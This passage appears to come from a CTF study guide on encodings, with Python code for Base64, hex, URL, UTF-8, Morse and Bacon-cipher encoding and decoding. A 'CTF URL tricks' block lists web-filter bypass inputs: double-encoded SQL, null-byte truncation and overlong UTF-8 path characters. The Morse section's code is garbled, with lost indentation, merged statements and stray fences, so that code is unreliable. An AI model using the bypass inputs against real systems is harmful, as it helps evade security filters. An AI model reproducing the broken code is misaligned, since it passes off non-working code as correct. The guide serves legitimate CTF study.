1. **Key extraction**: Extract public keys for cryptanalysis
2. **Extension analysis**: Check for custom OIDs or data in extensions
3. **Chain verification**: Validate signature chains for integrity
4. **Timestamp analysis**: Check creation/expiration dates for temporal hints
5. **Cross-referencing**: Compare certificate fingerprints with public databases (crt.sh, Censys)

---



---



---

# ENCODING & OBFUSCATION

## Encoding Schemes

### Base64 / Base32 / Base16

Base encodings convert binary data into ASCII-printable characters. These are encoding schemes, not encryption, and are trivially reversible.

**Base64 Encoding:**

```python
import base64

# Basic Base64 encoding/decoding
plaintext = b"Hello, World!"
encoded = base64.b64encode(plaintext)
decoded = base64.b64decode(encoded)

print(f"Original: {plaintext}")
print(f"Base64: {encoded}")
print(f"Decoded: {decoded}")

# Base64 characteristics
# - Uses: A-Z, a-z, 0-9, +, /
# - Padding: = or ==
# - 3 bytes → 4 characters (33% overhead)

# URL-safe Base64 (uses - and _ instead of + and /)
url_encoded = base64.urlsafe_b64encode(plaintext)
url_decoded = base64.urlsafe_b64decode(url_encoded)

print(f"URL-safe Base64: {url_encoded}")
```

**Base32 Encoding:**

```python
# Base32 encoding/decoding
plaintext = b"Hello, World!"
base32_encoded = base64.b32encode(plaintext)
base32_decoded = base64.b32decode(base32_encoded)

print(f"Base32: {base32_encoded}")
print(f"Decoded: {base32_decoded}")

# Base32 characteristics
# - Uses: A-Z, 2-7 (32 characters)
# - Case-insensitive
# - Padding: = characters
# - 5 bytes → 8 characters (60% overhead)

# Base32 variants
# Standard: RFC 4648 (A-Z, 2-7)
# Hex: 0-9, A-V
base32hex_encoded = base64.b32hexencode(plaintext)
print(f"Base32Hex: {base32hex_encoded}")
```

**Base16 (Hex) Encoding:**

```python
# Base16 encoding/decoding
plaintext = b"Hello, World!"
base16_encoded = base64.b16encode(plaintext)
base16_decoded = base64.b16decode(base16_encoded)

print(f"Base16: {base16_encoded}")
print(f"Decoded: {base16_decoded}")

# Base16 characteristics
# - Uses: 0-9, A-F
# - Case-insensitive
# - No padding
# - 1 byte → 2 characters (100% overhead)
```

**Automatic Base Detection:**

```python
import re
import base64

def detect_base_encoding(data):
    """
    Detect which base encoding is used
    [Inference] Based on character set and padding patterns
    """
    if isinstance(data, bytes):
        data = data.decode('ascii', errors='ignore')
    
    detections = []
    
    # Base64 detection
    base64_pattern = r'^[A-Za-z0-9+/]*={0,2}$'
    if re.match(base64_pattern, data) and len(data) % 4 == 0:
        detections.append({
            'encoding': 'Base64',
            'confidence': 'HIGH' if ('=' in data or '+' in data or '/' in data) else 'MEDIUM',
            'charset': 'A-Za-z0-9+/='
        })
    
    # URL-safe Base64
    urlsafe_pattern = r'^[A-Za-z0-9_-]*={0,2}$'
    if re.match(urlsafe_pattern, data) and len(data) % 4 == 0:
        if '_' in data or '-' in data:
            detections.append({
                'encoding': 'URL-safe Base64',
                'confidence': 'HIGH',
                'charset': 'A-Za-z0-9_-='
            })
    
    # Base32 detection
    base32_pattern = r'^[A-Z2-7]*={0,6}$'
    if re.match(base32_pattern, data.upper()) and len(data) % 8 == 0:
        detections.append({
            'encoding': 'Base32',
            'confidence': 'HIGH' if '=' in data else 'MEDIUM',
            'charset': 'A-Z2-7='
        })
    
    # Base16/Hex detection
    hex_pattern = r'^[0-9A-Fa-f]*$'
    if re.match(hex_pattern, data) and len(data) % 2 == 0:
        detections.append({
            'encoding': 'Base16/Hex',
            'confidence': 'HIGH' if len(data) > 4 else 'LOW',
            'charset': '0-9A-Fa-f'
        })
    
    return detections

# Test detection
test_strings = [
    "SGVsbG8sIFdvcmxkIQ==",          # Base64
    "JBSWY3DPEBLW64TMMQ======",      # Base32
    "48656c6c6f2c20576f726c6421",    # Hex
    "SGVsbG8sIFdvcmxkIQ",            # Base64 without padding
]

for test in test_strings:
    print(f"\nTesting: {test}")
    results = detect_base_encoding(test)
    for result in results:
        print(f"  {result['encoding']}: {result['confidence']} confidence")
```

**Multi-Layer Base Encoding:**

```python
def decode_recursive(encoded_data, max_depth=10):
    """
    Recursively decode multiple layers of base encoding
    Common in CTF challenges
    """
    if isinstance(encoded_data, bytes):
        encoded_data = encoded_data.decode('ascii', errors='ignore')
    
    current = encoded_data
    depth = 0
    decode_path = []
    
    while depth < max_depth:
        detections = detect_base_encoding(current)
        
        if not detections:
            break
        
        # Try each detected encoding
        decoded = None
        used_encoding = None
        
        for detection in sorted(detections, key=lambda x: x['confidence'], reverse=True):
            try:
                if detection['encoding'] == 'Base64':
                    decoded = base64.b64decode(current)
                    used_encoding = 'Base64'
                elif detection['encoding'] == 'URL-safe Base64':
                    decoded = base64.urlsafe_b64decode(current)
                    used_encoding = 'URL-safe Base64'
                elif detection['encoding'] == 'Base32':
                    decoded = base64.b32decode(current.upper())
                    used_encoding = 'Base32'
                elif detection['encoding'] == 'Base16/Hex':
                    decoded = bytes.fromhex(current)
                    used_encoding = 'Base16/Hex'
                
                if decoded:
                    # Check if result is printable ASCII
                    try:
                        decoded_str = decoded.decode('ascii')
                        if decoded_str != current:
                            decode_path.append(used_encoding)
                            current = decoded_str
                            depth += 1
                            break
                    except:
                        # Not ASCII, might be binary or another encoding
                        decode_path.append(used_encoding)
                        current = decoded
                        depth += 1
                        break
            except Exception as e:
                continue
        
        if not decoded or decoded == current.encode():
            break
    
    return {
        'final_result': current,
        'decode_path': decode_path,
        'layers': depth
    }

# Example: Multiple layers
original = b"FLAG{nested_encoding}"
layer1 = base64.b64encode(original)
layer2 = base64.b32encode(layer1)
layer3 = base64.b64encode(layer2)

print(f"Encoded (3 layers): {layer3}")

result = decode_recursive(layer3)
print(f"\nDecode path: {' -> '.join(result['decode_path'])}")
print(f"Layers decoded: {result['layers']}")
print(f"Final result: {result['final_result']}")
```

**Base85/Ascii85:**

```python
import base64

def base85_operations():
    """
    Base85 (Ascii85) encoding - more efficient than Base64
    """
    plaintext = b"Hello, World!"
    
    # Base85 encoding (a85)
    a85_encoded = base64.a85encode(plaintext)
    a85_decoded = base64.a85decode(a85_encoded)
    
    print(f"Original: {plaintext}")
    print(f"Ascii85: {a85_encoded}")
    print(f"Decoded: {a85_decoded}")
    
    # Base85 (b85) - RFC 1924 variant
    b85_encoded = base64.b85encode(plaintext)
    b85_decoded = base64.b85decode(b85_encoded)
    
    print(f"Base85: {b85_encoded}")
    
    # Characteristics:
    # - 4 bytes → 5 characters (25% overhead vs 33% for Base64)
    # - Uses: 0-9, A-Z, a-z, and other printable ASCII
    # - No padding required

base85_operations()
```

**CTF Base Encoding Tricks:**

```python
def ctf_base_tricks():
    """
    Common CTF tricks with base encodings
    """
    print("[Inference] CTF Base Encoding Tricks:\n")
    
    # 1. Incomplete padding
    print("1. Incomplete/Missing Padding:")
    incomplete = "SGVsbG8sIFdvcmxkIQ"  # Missing ==
    # Add padding manually
    padding_needed = (4 - len(incomplete) % 4) % 4
    complete = incomplete + '=' * padding_needed
    decoded = base64.b64decode(complete)
    print(f"   Fixed: {decoded}\n")
    
    # 2. Reversed base64
    print("2. Reversed Base64:")
    normal = base64.b64encode(b"SECRET")
    reversed_b64 = normal[::-1]
    print(f"   Reversed: {reversed_b64}")
    print(f"   Decode reversed: {base64.b64decode(reversed_b64[::-1])}\n")
    
    # 3. Custom alphabet
    print("3. Custom Base64 Alphabet:")
    print("   Standard: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
    print("   Custom:   May use different character set - need to substitute\n")
    
    # 4. Mixed encodings
    print("4. Mixed Character Encodings:")
    print("   Base64 → Hex → Base32 → Base64")
    print("   Use recursive decoder\n")
    
    # 5. Base64 in various contexts
    print("5. Context-Specific Base64:")
    print("   - JWT tokens (header.payload.signature)")
    print("   - Data URIs (data:image/png;base64,...)")
    print("   - HTTP Basic Auth (Authorization: Basic ...)")
    print("   - XML/JSON embedded data")

ctf_base_tricks()
```

### Hex Encoding

Hexadecimal encoding represents bytes as two-digit hex values (0-9, A-F).

**Basic Hex Operations:**

```python
def hex_operations():
    """
    Comprehensive hex encoding/decoding operations
    """
    plaintext = b"Hello, World!"
    
    # Method 1: bytes.hex()
    hex_encoded = plaintext.hex()
    print(f"hex(): {hex_encoded}")
    
    # Method 2: binascii
    import binascii
    hex_encoded2 = binascii.hexlify(plaintext).decode()
    print(f"hexlify(): {hex_encoded2}")
    
    # Method 3: Manual formatting
    hex_encoded3 = ''.join(f'{b:02x}' for b in plaintext)
    print(f"Manual: {hex_encoded3}")
    
    # Decoding
    decoded1 = bytes.fromhex(hex_encoded)
    decoded2 = binascii.unhexlify(hex_encoded)
    
    print(f"Decoded: {decoded1}")
    
    # Hex with prefixes/separators
    print("\nHex Variants:")
    print(f"0x prefix: {' '.join('0x' + hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2))}")
    print(f"\\x prefix: {''.join('\\x' + hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2))}")
    print(f"Colon-separated: {':'.join(hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2))}")
    print(f"Space-separated: {' '.join(hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2))}")

hex_operations()
```

**Hex String Parsing:**

```python
def parse_hex_variants(hex_string):
    """
    Parse hex strings in various formats
    Handles prefixes, separators, and mixed case
    """
    import re
    
    # Remove common prefixes and separators
    cleaned = hex_string
    
    # Remove 0x prefixes
    cleaned = re.sub(r'0x', '', cleaned, flags=re.IGNORECASE)
    
    # Remove \x prefixes
    cleaned = re.sub(r'\\x', '', cleaned)
    
    # Remove separators (space, colon, dash, comma)
    cleaned = re.sub(r'[\s:,\-]', '', cleaned)
    
    # Validate hex
    if not re.match(r'^[0-9A-Fa-f]*$', cleaned):
        raise ValueError("Invalid hex string")
    
    # Decode
    try:
        decoded = bytes.fromhex(cleaned)
        return decoded
    except ValueError as e:
        raise ValueError(f"Failed to decode hex: {e}")

# Test various formats
hex_formats = [
    "48656c6c6f",
    "0x48 0x65 0x6c 0x6c 0x6f",
    "\\x48\\x65\\x6c\\x6c\\x6f",
    "48:65:6c:6c:6f",
    "48 65 6c 6c 6f",
    "48-65-6C-6C-6F",
]

print("Parsing hex variants:")
for hex_str in hex_formats:
    try:
        result = parse_hex_variants(hex_str)
        print(f"  {hex_str[:30]:30s} → {result}")
    except Exception as e:
        print(f"  {hex_str[:30]:30s} → ERROR: {e}")
```

**Hex to Various Encodings:**

```python
def hex_conversions(hex_string):
    """
    Convert hex to various representations
    """
    data = bytes.fromhex(hex_string.replace(' ', '').replace('0x', ''))
    
    conversions = {
        'Binary': ' '.join(f'{b:08b}' for b in data),
        'Decimal': ' '.join(str(b) for b in data),
        'Octal': ' '.join(f'{b:03o}' for b in data),
        'ASCII': data.decode('ascii', errors='replace'),
        'Base64': base64.b64encode(data).decode(),
        'Integer': int.from_bytes(data, 'big'),
    }
    
    return conversions

# Example
hex_data = "48656c6c6f"
results = hex_conversions(hex_data)

print("Hex conversions:")
for format_name, value in results.items():
    print(f"  {format_name:10s}: {value}")
```

**Hex Dump Format:**

```python
def hex_dump(data, width=16):
    """
    Create hexdump-style output
    Common format for binary data analysis
    """
    if isinstance(data, str):
        data = data.encode()
    
    output = []
    
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        
        # Offset
        offset = f'{i:08x}'
        
        # Hex bytes
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        hex_part = hex_part.ljust(width * 3 - 1)
        
        # ASCII representation
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        
        output.append(f'{offset}  {hex_part}  |{ascii_part}|')
    
    return '\n'.join(output)

# Example
data = b"Hello, World! This is a hexdump example.\n"
print(hex_dump(data))
```

### URL Encoding

URL encoding (percent-encoding) represents special characters as %XX where XX is the hexadecimal byte value.

**Basic URL Encoding:**

```python
from urllib.parse import quote, unquote, quote_plus, unquote_plus

def url_encoding_operations():
    """
    URL encoding/decoding operations
    """
    test_string = "Hello World! #special chars: @$%"
    
    # Standard URL encoding
    encoded = quote(test_string)
    print(f"quote(): {encoded}")
    
    # URL encoding with + for spaces (application/x-www-form-urlencoded)
    encoded_plus = quote_plus(test_string)
    print(f"quote_plus(): {encoded_plus}")
    
    # Decoding
    decoded = unquote(encoded)
    decoded_plus = unquote_plus(encoded_plus)
    
    print(f"unquote(): {decoded}")
    print(f"unquote_plus(): {decoded_plus}")
    
    # Safe characters (not encoded)
    print(f"\nSafe chars: {quote(test_string, safe='')}")  # Encode everything
    print(f"Custom safe: {quote(test_string, safe='! ')}")  # Keep ! and space

url_encoding_operations()
```

**Double/Triple URL Encoding:**

```python
def detect_url_encoding_layers(encoded_string):
    """
    Detect and decode multiple layers of URL encoding
    Common obfuscation technique in CTF
    """
    current = encoded_string
    layers = []
    
    while '%' in current:
        try:
            decoded = unquote(current)
            if decoded == current:
                break
            layers.append('URL decode')
            current = decoded
        except:
            break
    
    return {
        'final_result': current,
        'layers': len(layers),
        'decode_path': layers
    }

# Example: Triple URL encoding
original = "FLAG{url_encoded}"
layer1 = quote(original)
layer2 = quote(layer1)
layer3 = quote(layer2)

print(f"Triple encoded: {layer3}")

result = detect_url_encoding_layers(layer3)
print(f"Layers: {result['layers']}")
print(f"Final: {result['final_result']}")
```

**URL Encoding Variants:**

```python
def url_encoding_variants(text):
    """
    Different URL encoding representations
    """
    from urllib.parse import quote
    
    variants = {}
    
    # Standard percent encoding
    variants['Standard'] = quote(text)
    
    # Unicode encoding (%uXXXX format - deprecated but sometimes seen)
    unicode_encoded = ''.join(f'%u{ord(c):04x}' if ord(c) > 127 else c for c in text)
    variants['Unicode (%uXXXX)'] = unicode_encoded
    
    # Double encoding
    variants['Double'] = quote(quote(text))
    
    # Mixed case hex (sometimes bypasses filters)
    mixed_encoded = ''
    for c in text:
        if c == ' ':
            mixed_encoded += '%20'
        elif not c.isalnum():
            # Randomly use uppercase or lowercase hex
            hex_val = f'{ord(c):02x}'
            mixed_encoded += f'%{hex_val}'
        else:
            mixed_encoded += c
    variants['Mixed case'] = mixed_encoded
    
    return variants

test = "Hello World!"
variants = url_encoding_variants(test)

print("URL encoding variants:")
for name, encoded in variants.items():
    print(f"  {name:20s}: {encoded}")
```

**URL Encoding in CTF Contexts:**

```python
def ctf_url_tricks():
    """
    Common URL encoding tricks in CTF challenges
    """
    print("[Inference] CTF URL Encoding Tricks:\n")
    
    print("1. Filter Bypass:")
    print("   Original: SELECT * FROM users")
    print("   Encoded:  SELECT%20*%20FROM%20users")
    print("   Double:   SELECT%2520*%2520FROM%2520users")
    print("   Mixed:    %53ELECT%20*%20FROM%20users\n")
    
    print("2. Null Byte Injection:")
    print("   file.php%00.jpg → may truncate at null")
    print("   %00 = null byte\n")
    
    print("3. Unicode Normalization:")
    print("   %C0%AF → may decode to / after normalization")
    print("   %E0%80%AF → overlong UTF-8 encoding of /\n")
    
    print("4. Case Variations:")
    print("   %2f vs %2F (both valid, may bypass case-sensitive filters)\n")
    
    print("5. Plus vs %20:")
    print("   'Hello+World' vs 'Hello%20World'")
    print("   Depends on context (query string vs path)")

ctf_url_tricks()
```

**Custom URL Decoder:**

```python
import re

def advanced_url_decode(encoded_string):
    """
    Advanced URL decoder handling edge cases
    """
    decoded = encoded_string
    
    # Handle standard percent encoding
    def decode_percent(match):
        hex_val = match.group(1)
        try:
            return chr(int(hex_val, 16))
        except:
            return match.group(0)  # Return original if invalid
    
    decoded = re.sub(r'%([0-9A-Fa-f]{2})', decode_percent, decoded)
    
    # Handle %uXXXX unicode encoding (deprecated)
    def decode_unicode(match):
        hex_val = match.group(1)
        try:
            return chr(int(hex_val, 16))
        except:
            return match.group(0)
    
    decoded = re.sub(r'%u([0-9A-Fa-f]{4})', decode_unicode, decoded)
    
    # Handle + as space (application/x-www-form-urlencoded)
    # Only if not in path context
    decoded = decoded.replace('+', ' ')
    
    return decoded

# Test
test_cases = [
    "Hello%20World",
    "Test%2BSign",
    "%48%65%6c%6c%6f",
    "%u0048%u0065%u006c%u006c%u006f",
]

print("Advanced URL decoding:")
for test in test_cases:
    print(f"  {test:30s} → {advanced_url_decode(test)}")
```

### ASCII/UTF-8

ASCII and UTF-8 encoding for character representation and conversion.

**ASCII Operations:**

```python
def ascii_operations():
    """
    ASCII encoding operations and conversions
    """
    text = "Hello"
    
    # String to ASCII values
    ascii_values = [ord(c) for c in text]
    print(f"ASCII values: {ascii_values}")
    
    # ASCII to string
    reconstructed = ''.join(chr(val) for val in ascii_values)
    print(f"Reconstructed: {reconstructed}")
    
    # ASCII ranges
    print("\nASCII Ranges:")
    print(f"  0-31: Control characters")
    print(f"  32-126: Printable characters")
    print(f"  48-57: Digits (0-9)")
    print(f"  65-90: Uppercase (A-Z)")
    print(f"  97-122: Lowercase (a-z)")
    
    # Check if string is ASCII
    test_strings = ["Hello", "Héllo", "こんにちは"]
    for s in test_strings:
        is_ascii = all(ord(c) < 128 for c in s)
        print(f"  '{s}' is ASCII: {is_ascii}")

ascii_operations()
```

**UTF-8 Operations:**

```python
def utf8_operations():
    """
    UTF-8 encoding operations
    """
    text = "Hello 世界 🌍"
    
    # Encode to UTF-8 bytes
    utf8_bytes = text.encode('utf-8')
    print(f"UTF-8 bytes: {utf8_bytes}")
    print(f"Hex: {utf8_bytes.hex()}")
    
    # Decode from UTF-8
    decoded = utf8_bytes.decode('utf-8')
    print(f"Decoded: {decoded}")
    
    # UTF-8 byte structure
    print("\nUTF-8 Encoding:")
    for char in text:
        encoded = char.encode('utf-8')
        codepoint = ord(char)
        print(f"  '{char}' (U+{codepoint:04X}): {encoded.hex()} ({len(encoded)} bytes)")
    
    # Handle encoding errors
    invalid_utf8 = b'\xff\xfe\xfd'
    try:
        decoded_strict = invalid_utf8.decode('utf-8')
    except UnicodeDecodeError as e:
        print(f"\nStrict decode error: {e}")
    
    # Error handling modes
    decoded_replace = invalid_utf8.decode('utf-8', errors='replace')
    decoded_ignore = invalid_utf8.decode('utf-8', errors='ignore')
    
    print(f"Replace mode: {decoded_replace}")
    print(f"Ignore mode: {decoded_ignore}")

utf8_operations()
```

**Character Encoding Detection:**

```python
def detect_character_encoding(data):
    """
    Attempt to detect character encoding
    [Inference] Based on byte patterns
    """
    if isinstance(data, str):
        data = data.encode('latin1')  # Preserve bytes
    
    encodings_to_try = ['utf-8', 'utf-16', 'utf-16-le', 'utf-16-be', 
                        'latin1', 'cp1252', 'ascii']
    
    results = []
    
    for encoding in encodings_to_try:
        try:
            decoded = data.decode(encoding)
            # Check if result is printable
            printable_ratio = sum(c.isprintable() or c.isspace() for c in decoded) / len(decoded)
            
            results.append({
                'encoding': encoding,
                'decoded': decoded,
                'printable_ratio': printable_ratio,
                'confidence': 'HIGH' if printable_ratio > 0.95 else 
                             'MEDIUM' if printable_ratio > 0.80 else 'LOW'
            })
        except:
            continue
    
    return sorted(results, key=lambda x: x['printable_ratio'], reverse=True)

# Test
test_data = "Hello, World!".encode('utf-8')
results = detect_character_encoding(test_data)

print("Encoding detection results:")
for result in results[:3]:  # Top 3
    print(f"  {result['encoding']:10s}: {result['confidence']:6s} ({result['printable_ratio']:.2%} printable)")
```

**ASCII Art and Special Characters:**

```python
def ascii_conversions():
    """
    Various ASCII representations
    """
    text = "CTF"
    
    print("ASCII Representations:\n")
    
    # Decimal
    decimal = ' '.join(str(ord(c)) for c in text)
    print(f"Decimal: {decimal}")
    
    # Hexadecimal
    hex_repr = ' '.join(f'0x{ord(c):02x}' for c in text)
    print(f"Hex: {hex_repr}")
    
    # Binary
    binary = ' '.join(f'{ord(c):08b}' for c in text)
    print(f"Binary: {binary}")
    
    # Octal
    octal = ' '.join(f'{ord(c):03o}' for c in text)
    print(f"Octal: {octal}")
    
    # HTML entities
    html_decimal = ''.join(f'&#{ord(c)};' for c in text)
    html_hex = ''.join(f'&#x{ord(c):02x};' for c in text)
    print(f"HTML (decimal): {html_decimal}")
    print(f"HTML (hex): {html_hex}")
    
    # Python string literal
    python_literal = repr(text)
    print(f"Python literal: {python_literal}")

ascii_conversions()
```

### Morse Code

Morse code represents characters as sequences of dots (.) and dashes (-).

**Morse Code Implementation:**

```python
# Standard International Morse Code
MORSE_CODE = {
    'A': '.-',    'B': '-...',  'C': '-.-.',  'D': '-..',   'E': '.',
    'F': '..-.',  'G': '--.',   'H': '....',  'I': '..',    'J': '.---',
    'K': '-.-',   'L': '.-..',  'M': '--',    'N': '-.',    'O': '---',
    'P': '.--.',  'Q': '--.-',  'R': '.-.',   'S': '...',   'T': '-',
    'U': '..-',   'V': '...-',  'W': '.--',   'X': '-..-',  'Y': '-.--',
    'Z': '--..',
    '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-',
    '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.',
    '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.',
    '!': '-.-.--', '/': '-..-.', '(': '-.--.', ')': '-.--.-',
    '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
    '+': '.-.-.', '-': '-....-', '_': '..--.-', '"': '.-..-.',
    '$': '...-..-', '@': '.--.-.', ' ': '/'
}

# Reverse dictionary for decoding
MORSE_DECODE = {v: k for k, v in MORSE_CODE.items()}

def morse_encode(text):
    """
    Encode text to Morse code
    """
    text = text.upper()
    encoded = []
    
    for char in text:
        if char in MORSE_CODE:
            encoded.append(MORSE_CODE[char])
        elif char == ' ':
            encoded.append('/')  # Word separator
        else:
            encoded.append('?')  # Unknown character
    
    return ' '.join(encoded)

def morse_decode(morse):
    """
    Decode Morse code to text
    """
    # Split by spaces
    morse_chars = morse.split(' ')

decoded = []

for morse_char in morse_chars:
    if morse_char in MORSE_DECODE:
        decoded.append(MORSE_DECODE[morse_char])
    elif morse_char == '/' or morse_char == '':
        decoded.append(' ')
    else:
        decoded.append('?')  # Unknown Morse character

return ''.join(decoded)

# Example usage

plaintext = "HELLO WORLD" morse = morse_encode(plaintext) decoded = morse_decode(morse)

print(f"Original: {plaintext}") print(f"Morse: {morse}") print(f"Decoded: {decoded}")
````

**Morse Code Variants:**

```python
def morse_variants():
    """
    Handle different Morse code representations
    """
    text = "SOS"
    standard_morse = morse_encode(text)
    
    variants = {
        'Standard (. -)': standard_morse,
        'Binary (0 1)': standard_morse.replace('.', '0').replace('-', '1'),
        'Audio (dit dah)': standard_morse.replace('.', 'dit').replace('-', 'dah'),
        'Visual (● ▬)': standard_morse.replace('.', '●').replace('-', '▬'),
        'Compact (no spaces)': standard_morse.replace(' ', ''),
        'Word separator (/)': standard_morse.replace(' / ', ' / '),
    }
    
    print(f"Text: {text}\n")
    for name, encoded in variants.items():
        print(f"{name:20s}: {encoded}")

morse_variants()
````

**Morse Code Parser (Flexible):**

```python
import re

def parse_morse_flexible(morse_string):
    """
    Parse Morse code with flexible formatting
    Handles various separators and representations
    """
    # Normalize input
    normalized = morse_string
    
    # Convert binary to dots/dashes
    if re.match(r'^[01\s/]+$', normalized):
        normalized = normalized.replace('0', '.').replace('1', '-')
    
    # Convert dit/dah to dots/dashes
    normalized = normalized.replace('dit', '.').replace('dah', '-')
    
    # Convert visual symbols
    normalized = normalized.replace('●', '.').replace('▬', '-')
    normalized = normalized.replace('•', '.').replace('—', '-')
    
    # Normalize separators
    # Try to detect word separators
    if '/' in normalized:
        # / is word separator
        pass
    elif '   ' in normalized:  # 3 spaces
        normalized = normalized.replace('   ', ' / ')
    
    # Ensure single space between characters
    normalized = re.sub(r'\s+', ' ', normalized)
    normalized = normalized.strip()
    
    # Decode
    try:
        decoded = morse_decode(normalized)
        return {
            'success': True,
            'decoded': decoded,
            'normalized': normalized
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'normalized': normalized
        }

# Test various formats
test_cases = [
    ".... . .-.. .-.. --- / .-- --- .-. .-.. -..",
    "01001010010010100111011101110111011101110",  # Binary
    "dit dit dit dit / dit / dit dah dit dit / dit dah dit dit / dah dah dah",
    "●●●● ● ●▬●● ●▬●● ▬▬▬ / ▬▬▬ ▬▬▬ ▬●▬ ▬●▬ ●●",
]

print("Flexible Morse parsing:")
for test in test_cases:
    result = parse_morse_flexible(test)
    if result['success']:
        print(f"  Decoded: {result['decoded']}")
    else:
        print(f"  Error: {result['error']}")
```

**Morse Code Audio Generation (Conceptual):**

```python
def morse_to_audio_info():
    """
    Information about Morse code audio characteristics
    [Unverified] Actual audio generation requires sound libraries
    """
    print("[Inference] Morse Code Audio Characteristics:\n")
    
    print("Timing (using dit as unit):")
    print("  - Dot (dit): 1 unit")
    print("  - Dash (dah): 3 units")
    print("  - Gap between symbols: 1 unit")
    print("  - Gap between letters: 3 units")
    print("  - Gap between words: 7 units")
    
    print("\nStandard Frequencies:")
    print("  - CW (Continuous Wave): 600-800 Hz")
    print("  - Amateur Radio: 700-800 Hz")
    print("  - Military: 1000 Hz")
    
    print("\nSpeed (WPM - Words Per Minute):")
    print("  - Beginner: 5-10 WPM")
    print("  - Standard: 12-20 WPM")
    print("  - High Speed: 25-40 WPM")
    print("  - Professional: 40+ WPM")
    
    print("\n[Example] Generate using libraries:")
    print("  - numpy + scipy for waveform")
    print("  - pydub for audio file creation")
    print("  - pygame for playback")

morse_to_audio_info()
```

**Morse Code CTF Recognition:**

```python
def identify_morse_code(data):
    """
    Detect if data is Morse code
    [Inference] Based on character patterns
    """
    if isinstance(data, bytes):
        data = data.decode('ascii', errors='ignore')
    
    indicators = []
    confidence = 0
    
    # Check for Morse characters
    morse_chars = set('.-/')
    data_chars = set(data.replace(' ', ''))
    
    if data_chars.issubset(morse_chars):
        indicators.append("Contains only Morse characters (.-/)")
        confidence += 40
    
    # Check for binary representation
    if re.match(r'^[01\s/]+$', data):
        indicators.append("Binary format (0s and 1s)")
        confidence += 20
    
    # Check for dit/dah
    if 'dit' in data.lower() or 'dah' in data.lower():
        indicators.append("Audio representation (dit/dah)")
        confidence += 40
    
    # Check for typical Morse patterns
    if re.search(r'\.\.\.|---', data):  # SOS pattern
        indicators.append("Contains SOS pattern (...---...)")
        confidence += 30
    
    # Check spacing patterns
    if ' / ' in data:
        indicators.append("Word separator (/) present")
        confidence += 20
    
    # Check length patterns
    tokens = data.split()
    if tokens:
        avg_length = sum(len(t) for t in tokens) / len(tokens)
        if 1 <= avg_length <= 6:  # Typical Morse character length
            indicators.append(f"Average token length ({avg_length:.1f}) matches Morse")
            confidence += 10
    
    return {
        'is_morse': confidence >= 30,
        'confidence': min(confidence, 100),
        'indicators': indicators
    }

# Test detection
test_strings = [
    ".... . .-.. .-.. ---",
    "01001010010010100111",
    "dit dit dah dit",
    "Hello World",
    "... --- ...",
]

print("Morse code detection:")
for test in test_strings:
    result = identify_morse_code(test)
    status = "✓" if result['is_morse'] else "✗"
    print(f"{status} '{test[:30]}': {result['confidence']}% confidence")
    if result['indicators']:
        for indicator in result['indicators'][:2]:
            print(f"    - {indicator}")
```

### Bacon Cipher (5-bit)

The Bacon cipher encodes each letter as a 5-bit binary sequence using only two symbols (traditionally A and B, or 0 and 1).

**Bacon Cipher Implementation:**

```python
# Bacon cipher encoding table (original)
BACON_ORIGINAL = {
    'A': 'AAAAA', 'B': 'AAAAB', 'C': 'AAABA', 'D': 'AAABB', 'E': 'AABAA',
    'F': 'AABAB', 'G': 'AABBA', 'H': 'AABBB', 'I': 'ABAAA', 'J': 'ABAAA',  # I/J same
    'K': 'ABAAB', 'L': 'ABABA', 'M': 'ABABB', 'N': 'ABBAA', 'O': 'ABBAB',
    'P': 'ABBBA', 'Q': 'ABBBB', 'R': 'BAAAA', 'S': 'BAAAB', 'T': 'BAABA',
    'U': 'BAABB', 'V': 'BAABB',  # U/V same
    'W': 'BABAA', 'X': 'BABAB', 'Y': 'BABBA', 'Z': 'BABBB'
}

# Modern variant (26 distinct letters)
BACON_MODERN = {
    'A': 'AAAAA', 'B': 'AAAAB', 'C': 'AAABA', 'D': 'AAABB', 'E': 'AABAA',
    'F': 'AABAB', 'G': 'AABBA', 'H': 'AABBB', 'I': 'ABAAA', 'J': 'ABAAB',
    'K': 'ABABA', 'L': 'ABABB', 'M': 'ABBAA', 'N': 'ABBAB', 'O': 'ABBBA',
    'P': 'ABBBB', 'Q': 'BAAAA', 'R': 'BAAAB', 'S': 'BAABA', 'T': 'BAABB',
    'U': 'BABAA', 'V': 'BABAB', 'W': 'BABBA', 'X': 'BABBB', 'Y': 'BBAAA',
    'Z': 'BBAAB'
}

def bacon_encode(text, variant='modern'):
    """
    Encode text using Bacon cipher
    """
    table = BACON_MODERN if variant == 'modern' else BACON_ORIGINAL
    text = text.upper()
    
    encoded = []
    for char in text:
        if char in table:
            encoded.append(table[char])
        elif char == ' ':
            encoded.append(' ')  # Preserve spaces
    
    return ''.join(encoded)

def bacon_decode(bacon_text, variant='modern'):
    """
    Decode Bacon cipher
    """
    table = BACON_MODERN if variant == 'modern' else BACON_ORIGINAL
    # Create reverse mapping
    reverse_table = {v: k for k, v in table.items()}
    
    # Normalize to A/B
    bacon_text = bacon_text.upper()
    bacon_text = bacon_text.replace('0', 'A').replace('1', 'B')
    
    decoded = []
    i = 0
    
    while i < len(bacon_text):
        if bacon_text[i] == ' ':
            decoded.append(' ')
            i += 1
            continue
        
        # Extract 5-character group
        group = bacon_text[i:i+5]
        if len(group) == 5 and group in reverse_table:
            decoded.append(reverse_table[group])
            i += 5
        else:
            decoded.append('?')
            i += 1
    
    return ''.join(decoded)

# Example
plaintext = "HELLO"
encoded = bacon_encode(plaintext)
decoded = bacon_decode(encoded)

print(f"Original: {plaintext}")
print(f"Bacon: {encoded}")
print(f"Decoded: {decoded}")
```

**Bacon Cipher with Steganography:**

```python
def bacon_steganography_encode(plaintext, cover_text):
    """
    Encode message in Bacon cipher hidden in cover text
    Uses typography (bold/italic, case, fonts) to encode A/B
    
    Simplified: uppercase = B, lowercase = A
    """
    bacon = bacon_encode(plaintext).replace(' ', '')
    
